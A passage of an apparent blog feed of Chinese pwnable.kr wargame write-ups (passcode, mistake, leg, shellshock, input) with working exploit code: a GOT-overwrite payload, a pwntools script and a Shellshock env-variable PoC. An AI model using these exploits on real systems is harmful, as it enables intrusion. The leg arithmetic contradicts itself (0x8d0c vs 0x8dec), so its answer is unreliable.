&lt;login+141&gt;</span><br><span class="line">   0x080485ce &lt;+106&gt;:	cmp    DWORD PTR [ebp-0xc],0xcc07c9</span><br><span class="line">   0x080485d5 &lt;+113&gt;:	jne    0x80485f1 &lt;login+141&gt;</span><br><span class="line">   0x080485d7 &lt;+115&gt;:	mov    DWORD PTR [esp],0x80487a5</span><br><span class="line">   0x080485de &lt;+122&gt;:	call   0x8048450 &lt;puts@plt&gt;</span><br><span class="line">   0x080485e3 &lt;+127&gt;:	mov    DWORD PTR [esp],0x80487af</span><br><span class="line">   0x080485ea &lt;+134&gt;:	call   0x8048460 &lt;system@plt&gt;</span><br><span class="line">   0x080485ef &lt;+139&gt;:	leave  </span><br><span class="line">   0x080485f0 &lt;+140&gt;:	ret    </span><br><span class="line">   0x080485f1 &lt;+141&gt;:	mov    DWORD PTR [esp],0x80487bd</span><br><span class="line">   0x080485f8 &lt;+148&gt;:	call   0x8048450 &lt;puts@plt&gt;</span><br><span class="line">   0x080485fd &lt;+153&gt;:	mov    DWORD PTR [esp],0x0</span><br><span class="line">   0x08048604 &lt;+160&gt;:	call   0x8048480 &lt;exit@plt&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>​    从反编译的代码中，可以看到name和passcode1相对于ebp的偏移分别为ebp-0x70、ebp-0x10。因为栈空间是平衡的，所以进入welcome()和login()后，ebp的位置在程序栈空间中都是一个地址。那么很容易我们可以在赋值name时先填充0x60的数据比如’A’，然后填充一个想要去赋值的四字节地址，就可以达到对任意地址的写入了。</p>
<p>​    接着分析，这种情况下就考虑直接去GOT中替换程序中用到的某个函数比如fflush()，即把passcode1替换为fflush()的地址，然后在scanf(“%d”,passcode1)时输入printf(“Login OK!\n”)所在地址，然后call fflush()时就可以直接跳过验证流程cat flag。</p>
<p>​    查看一下passcode开启的保护，并未开启NX，那就可以直接查地址使用即可，不用再leaklibc了：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210811184424.png"></p>
<p>​    oledump找到fflush()地址：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210811185545.png"></p>
<p>​    构造exp，两种方式利用：</p>
<ul>
<li>ssh直接链接利用：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">python2 -c <span class="string">&quot;print &#x27;A&#x27;*0x60+&#x27;\x04\xa0\x04\x08&#x27;+str(0x080485d7)&quot;</span> | ./passcode</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210811185732.png"></p>
<ul>
<li>使用pwntools利用：</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	shell = ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;passcode&#x27;</span>,port=<span class="number">2222</span>,password=<span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">	fflushAddr = <span class="number">0x0804a004</span></span><br><span class="line">	loginAddr = <span class="number">0x080485d7</span></span><br><span class="line">	p = shell.process(<span class="string">&#x27;passcode&#x27;</span>)</span><br><span class="line">	payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x60</span> + p32(fflushAddr)+<span class="built_in">str</span>(loginAddr)</span><br><span class="line">	p.send(payload)</span><br><span class="line">	p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210811185827.png"></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr系列刷题之09-mistake</title>
    <url>/2021/09/08/pwnable/pwnable.kr%E7%B3%BB%E5%88%9709-mistake/</url>
    <content><![CDATA[<p> 从提示信息来看，本题和操作符优先级相关，具体信息如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210908095621.png"></p>
<p>​    照例ssh链接查看源码等信息：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210908142915.png"></p>
<p>​    从服务器把mistake.c下载下来查看漏洞源码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PW_LEN 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> XORKEY 1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xor</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">		s[i] ^= XORKEY;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> fd;</span><br><span class="line">	<span class="keyword">if</span>(fd=open(<span class="string">&quot;/home/mistake/password&quot;</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;can&#x27;t open password %d\n&quot;</span>, fd);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;do not bruteforce...\n&quot;</span>);</span><br><span class="line">	sleep(time(<span class="number">0</span>)%<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> pw_buf[PW_LEN+<span class="number">1</span>];</span><br><span class="line">	<span class="keyword">int</span> len;</span><br><span class="line">	<span class="keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;read error\n&quot;</span>);</span><br><span class="line">		close(fd);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> pw_buf2[PW_LEN+<span class="number">1</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;input password : &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%10s&quot;</span>, pw_buf2);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// xor your input</span></span><br><span class="line">	<span class="keyword">xor</span>(pw_buf2, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!<span class="built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Password OK\n&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;/bin/cat flag\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Wrong Password\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	close(fd);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<p>​    这道题从直观上来看，就是首先读取同目录password的10个字节内容，然后我们输入10个字节数据并将其每个字节与0x1进行异或，最后对两个值比较，一致则得到flag。</p>
<p>​    但是从ssh链接信息来看，password和flag一样，当前账户没有读写权限，那么想要直接查看password内容就行不通了。</p>
<p>​    结合题目提示信息，对代码再次梳理后发现了问题所在，从第17行、27行，细心的人一看就能发现问题，27行对于len的赋值多加了个括号提高优先级。在C/C++中，关系运算符的优先级要高于赋值运算符，所以17行的<code>if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)</code>这句代码，fd恒为0，而0作为文件描述符的一种，指向了stdin。相应的，27行read()读取的内容就是从stdin读取，而不是读取password内容。这也就是源码中使用<code>sleep(time(0)%20)</code>的原因，让我们以为程序执行起来后等待stdin键入内容的操作为程序睡眠操作，从而忽略这个关键点。</p>
<p>​    综上所述，只要控制stdin内容，那么两个要比较的buffer就都可以控制了，也就可以成功的cat flag了。验证一下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210908151725.png"></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr系列刷题之08-leg</title>
    <url>/2021/09/07/pwnable/pwnable.kr%E7%B3%BB%E5%88%9708-leg/</url>
    <content><![CDATA[<p>  题目描述如下，看起来是和arm汇编相关，提供了ssh链接以及对应文件的下载地址：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210831153234.png"></p>
<p>​    将对应文件下载，ssh链接上服务器，开始做题，其中leg.c和leg.asm内容如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov r3, pc\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">    <span class="string">&quot;push    &#123;r6&#125;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;add    r6, pc, $1\n&quot;</span></span><br><span class="line">    <span class="string">&quot;bx    r6\n&quot;</span></span><br><span class="line">    <span class="string">&quot;.code   16\n&quot;</span></span><br><span class="line">    <span class="string">&quot;mov    r3, pc\n&quot;</span></span><br><span class="line">    <span class="string">&quot;add    r3, $0x4\n&quot;</span></span><br><span class="line">    <span class="string">&quot;push    &#123;r3&#125;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pop    &#123;pc&#125;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;.code    32\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pop    &#123;r6&#125;\n&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key3</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov r3, lr\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Daddy has very strong arm! : &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line">    <span class="keyword">if</span>( (key1()+key2()+key3()) == key )&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Congratz!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> fd = open(<span class="string">&quot;flag&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">        <span class="keyword">int</span> r = read(fd, buf, <span class="number">100</span>);</span><br><span class="line">        write(<span class="number">0</span>, buf, r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;I have strong leg :P\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) disass main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00008d3c &lt;+0&gt;:    push    &#123;r4, r11, lr&#125;</span><br><span class="line">   0x00008d40 &lt;+4&gt;:    add    r11, sp, #8</span><br><span class="line">   0x00008d44 &lt;+8&gt;:    sub    sp, sp, #12</span><br><span class="line">   0x00008d48 &lt;+12&gt;:    mov    r3, #0</span><br><span class="line">   0x00008d4c &lt;+16&gt;:    str    r3, [r11, #-16]</span><br><span class="line">   0x00008d50 &lt;+20&gt;:    ldr    r0, [pc, #104]    ; 0x8dc0 &lt;main+132&gt;</span><br><span class="line">   0x00008d54 &lt;+24&gt;:    bl    0xfb6c &lt;printf&gt;</span><br><span class="line">   0x00008d58 &lt;+28&gt;:    sub    r3, r11, #16</span><br><span class="line">   0x00008d5c &lt;+32&gt;:    ldr    r0, [pc, #96]    ; 0x8dc4 &lt;main+136&gt;</span><br><span class="line">   0x00008d60 &lt;+36&gt;:    mov    r1, r3</span><br><span class="line">   0x00008d64 &lt;+40&gt;:    bl    0xfbd8 &lt;__isoc99_scanf&gt;</span><br><span class="line">   0x00008d68 &lt;+44&gt;:    bl    0x8cd4 &lt;key1&gt;</span><br><span class="line">   0x00008d6c &lt;+48&gt;:    mov    r4, r0</span><br><span class="line">   0x00008d70 &lt;+52&gt;:    bl    0x8cf0 &lt;key2&gt;</span><br><span class="line">   0x00008d74 &lt;+56&gt;:    mov    r3, r0</span><br><span class="line">   0x00008d78 &lt;+60&gt;:    add    r4, r4, r3</span><br><span class="line">   0x00008d7c &lt;+64&gt;:    bl    0x8d20 &lt;key3&gt;</span><br><span class="line">   0x00008d80 &lt;+68&gt;:    mov    r3, r0</span><br><span class="line">   0x00008d84 &lt;+72&gt;:    add    r2, r4, r3</span><br><span class="line">   0x00008d88 &lt;+76&gt;:    ldr    r3, [r11, #-16]</span><br><span class="line">   0x00008d8c &lt;+80&gt;:    cmp    r2, r3</span><br><span class="line">   0x00008d90 &lt;+84&gt;:    bne    0x8da8 &lt;main+108&gt;</span><br><span class="line">   0x00008d94 &lt;+88&gt;:    ldr    r0, [pc, #44]    ; 0x8dc8 &lt;main+140&gt;</span><br><span class="line">   0x00008d98 &lt;+92&gt;:    bl    0x1050c &lt;puts&gt;</span><br><span class="line">   0x00008d9c &lt;+96&gt;:    ldr    r0, [pc, #40]    ; 0x8dcc &lt;main+144&gt;</span><br><span class="line">   0x00008da0 &lt;+100&gt;:    bl    0xf89c &lt;system&gt;</span><br><span class="line">   0x00008da4 &lt;+104&gt;:    b    0x8db0 &lt;main+116&gt;</span><br><span class="line">   0x00008da8 &lt;+108&gt;:    ldr    r0, [pc, #32]    ; 0x8dd0 &lt;main+148&gt;</span><br><span class="line">   0x00008dac &lt;+112&gt;:    bl    0x1050c &lt;puts&gt;</span><br><span class="line">   0x00008db0 &lt;+116&gt;:    mov    r3, #0</span><br><span class="line">   0x00008db4 &lt;+120&gt;:    mov    r0, r3</span><br><span class="line">   0x00008db8 &lt;+124&gt;:    sub    sp, r11, #8</span><br><span class="line">   0x00008dbc &lt;+128&gt;:    pop    &#123;r4, r11, pc&#125;</span><br><span class="line">   0x00008dc0 &lt;+132&gt;:    andeq    r10, r6, r12, lsl #9</span><br><span class="line">   0x00008dc4 &lt;+136&gt;:    andeq    r10, r6, r12, lsr #9</span><br><span class="line">   0x00008dc8 &lt;+140&gt;:            ; &lt;UNDEFINED&gt; instruction: 0x0006a4b0</span><br><span class="line">   0x00008dcc &lt;+144&gt;:            ; &lt;UNDEFINED&gt; instruction: 0x0006a4bc</span><br><span class="line">   0x00008dd0 &lt;+148&gt;:    andeq    r10, r6, r4, asr #9</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key1</span><br><span class="line">Dump of assembler code for function key1:</span><br><span class="line">   0x00008cd4 &lt;+0&gt;:    push    &#123;r11&#125;        ; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cd8 &lt;+4&gt;:    add    r11, sp, #0</span><br><span class="line">   0x00008cdc &lt;+8&gt;:    mov    r3, pc</span><br><span class="line">   0x00008ce0 &lt;+12&gt;:    mov    r0, r3</span><br><span class="line">   0x00008ce4 &lt;+16&gt;:    sub    sp, r11, #0</span><br><span class="line">   0x00008ce8 &lt;+20&gt;:    pop    &#123;r11&#125;        ; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008cec &lt;+24&gt;:    bx    lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key2</span><br><span class="line">Dump of assembler code for function key2:</span><br><span class="line">   0x00008cf0 &lt;+0&gt;:    push    &#123;r11&#125;        ; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cf4 &lt;+4&gt;:    add    r11, sp, #0</span><br><span class="line">   0x00008cf8 &lt;+8&gt;:    push    &#123;r6&#125;        ; (str r6, [sp, #-4]!)</span><br><span class="line">   0x00008cfc &lt;+12&gt;:    add    r6, pc, #1</span><br><span class="line">   0x00008d00 &lt;+16&gt;:    bx    r6</span><br><span class="line">   0x00008d04 &lt;+20&gt;:    mov    r3, pc</span><br><span class="line">   0x00008d06 &lt;+22&gt;:    adds    r3, #4</span><br><span class="line">   0x00008d08 &lt;+24&gt;:    push    &#123;r3&#125;</span><br><span class="line">   0x00008d0a &lt;+26&gt;:    pop    &#123;pc&#125;</span><br><span class="line">   0x00008d0c &lt;+28&gt;:    pop    &#123;r6&#125;        ; (ldr r6, [sp], #4)</span><br><span class="line">   0x00008d10 &lt;+32&gt;:    mov    r0, r3</span><br><span class="line">   0x00008d14 &lt;+36&gt;:    sub    sp, r11, #0</span><br><span class="line">   0x00008d18 &lt;+40&gt;:    pop    &#123;r11&#125;        ; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d1c &lt;+44&gt;:    bx    lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key3</span><br><span class="line">Dump of assembler code for function key3:</span><br><span class="line">   0x00008d20 &lt;+0&gt;:    push    &#123;r11&#125;        ; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008d24 &lt;+4&gt;:    add    r11, sp, #0</span><br><span class="line">   0x00008d28 &lt;+8&gt;:    mov    r3, lr</span><br><span class="line">   0x00008d2c &lt;+12&gt;:    mov    r0, r3</span><br><span class="line">   0x00008d30 &lt;+16&gt;:    sub    sp, r11, #0</span><br><span class="line">   0x00008d34 &lt;+20&gt;:    pop    &#123;r11&#125;        ; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d38 &lt;+24&gt;:    bx    lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<p>​    从源码可以看出，本题主要是和内联arm汇编相关，其中key1，key2，key3三个函数内容都是arm内联汇编的，成功cat flag的条件就是使得输入的key=key1()+key2()+key3()即可。</p>
<p>​    arm汇编和我们熟悉的x86体系汇编有很大不同，这道题考验了基础的arm汇编熟悉程度，leg.asm是已经反编译好的汇编代码。</p>
<p>​    这里挨个对key1，key2，key3进行分析，计算好r0中的返回值后加起来即可得到需要的buf。</p>
<ul>
<li>key1：先给r3赋值pc的值,此时地址为0x00008cdc，由于arm模式下是流水线作业，当执行到key1+0x8时pc值已经指向了下两条地址也就是pc值+0x8，所以执行完这条指令后，r3=0x00008ce4，然后将r3中值赋值给r0，r0存储返回值，所以key1()返回值为0x00008ce4</li>
<li>key2：从函数填充堆栈后，给r6赋值开始<ul>
<li>key2+0x8：r6中的值压入堆栈，后面用到r6这个寄存器</li>
<li>key2+0x12：给pc+0x1，用于后面bx跳转到Thumb模式下，r6=0x00008d05</li>
<li>key2+0x16：跳转指令，目标地址bit[0]=1，切换到Thumb状态</li>
<li>key2+0x20：Thumb模式下指令集为16bit，此时r3=0x00008d08</li>
<li>key2+0x22：r3=0x00008d0c，然后key2+0x32处将r3的值赋值给r0，所以key2()返回值为0x00008dec</li>
</ul>
</li>
<li>key3：main函数都是使用bl来调用key系列函数，即进入key3后，lr存储返回地址，也就是此时pc-0x4处的值，为0x00008d80，所以执行完毕后r0存储的返回值为0x00008d80</li>
</ul>
<p>综上，我们需要输入的值为0x00008ce4+0x00008dec+0x00008d80=0x1A850=108624即可</p>
<p>测试如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210907194202.png"></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr系列刷题之10-shellshock</title>
    <url>/2021/09/12/pwnable/pwnable.kr%E7%B3%BB%E5%88%9710-shellshock/</url>
    <content><![CDATA[<p>​    看提示信息是和bash相关：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210908164754.png"></p>
<p>​    ssh链接查看：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210908171601.png"></p>
<p>​    很熟悉的几个文件，把shellshock.c下载查看源码分析：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    setresuid(getegid(), getegid(), getegid());</span><br><span class="line">    setresgid(getegid(), getegid(), getegid());</span><br><span class="line">    system(<span class="string">&quot;/home/shellshock/bash -c &#x27;echo shock_me&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<p>​    很短的几行代码，这里需要了解一下Linux下进程权限问题，才好理解3、4行代码。</p>
<p>​    linux下进程权限有这么几个相关的属性：</p>
<ul>
<li>ruid/rgid(实际用户id：real userid，real group id)：由启动进程的用户来决定，通常是当前登录用户(即运行可执行文件的用户)</li>
<li>euid/egid(有效用户：effective userid，effective group id)：一般在进程启动时，直接由ruid/rgid复制而来，或者是当进程对应的可执行文件的set-user-id/set-group-id即那个rwx之外的s标志位)标志位为true时，其为该文件的所属用户/组。euid/egid决定了进程访问文件的权限。</li>
<li>suid/sgid(保存用户id:saved setuserid、)：从euid/egid复制。</li>
</ul>
<p>​    ssh后运行shellshock是以other权限来执行的，执行后setresuid()/setresgid()可以设置上述的几个权限，函数原型如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE         <span class="comment">/* See feature_test_macros(7) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="comment">//setresuid, setresgid - set real, effective and saved user or group ID</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setresuid</span><span class="params">(<span class="keyword">uid_t</span> ruid, <span class="keyword">uid_t</span> euid, <span class="keyword">uid_t</span> suid)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setresgid</span><span class="params">(<span class="keyword">gid_t</span> rgid, <span class="keyword">gid_t</span> egid, <span class="keyword">gid_t</span> sgid)</span></span>;</span><br></pre></td></tr></table></figure>

<p>​    程序将所有的这几个权限设置为egid，egid对应的用户组s标志位刚好为true，所以3、4行代码的意思就是把程序shellshock权限提升为shellshock_pwn组权限，用来后面读flag。</p>
<p>​    程序system并没有对flag进行读取操作，这里就需要费点脑筋了，其实如果对漏洞熟悉的话，看到shellshock这个名字就能想起来那个shellshock破壳漏洞(CVE-2014-6271)，该漏洞的分析可以见我的<a href="http://hskull.cn/2021/09/14/shellsock%E6%BC%8F%E6%B4%9E(CVE-2014-6271)">分析报告</a>。通过该漏洞源码，发现setresuid()/setresgid()其实还有另一种作用，那就是保证ruid和euid相同使得漏洞可以触发。</p>
<p><strong>做题：</strong></p>
<ol>
<li>先验证一下服务器bash版本和漏洞是否存在，测试poc用<code>env x=&#39;() &#123; :;&#125;; echo vulnerable&#39; /home/shellshock/bash -c &quot;echo this is a test&quot;</code>，system()中用到的bash是存在该漏洞的：</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210912204518.png"></p>
<ol start="2">
<li>改造poc，将<code>echo vulnerable</code>改为<code>bash -c cat flag</code>，然后测试，可以成功cat flag，本题完成。</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/cve_shellshock20210912205108.png"></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr系列刷题之07-input</title>
    <url>/2021/08/28/pwnable/pwnable.kr%E7%B3%BB%E5%88%9707-input/</url>
    <content><![CDATA[<p>  看提示信息，该题也是一个和input相关的题目，信息如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210812163245.png"></p>
<p>​    连上去看文件和权限，同时可以把源码和程序都到本地便于调试分析：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210812163514.png"></p>
<p>​    input.c源码及反编译代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to pwnable.kr\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s see if you know how to give input to program\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Just give me correct inputs then you will get the flag :)\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// argv</span></span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;A&#x27;</span>],<span class="string">&quot;\x00&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 1 clear!\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// stdio</span></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x00\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x02\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 2 clear!\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// env</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;\xca\xfe\xba\xbe&quot;</span>, getenv(<span class="string">&quot;\xde\xad\xbe\xef&quot;</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 3 clear!\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// file</span></span><br><span class="line">    FILE* fp = fopen(<span class="string">&quot;\x0a&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x00\x00\x00&quot;</span>, <span class="number">4</span>) ) 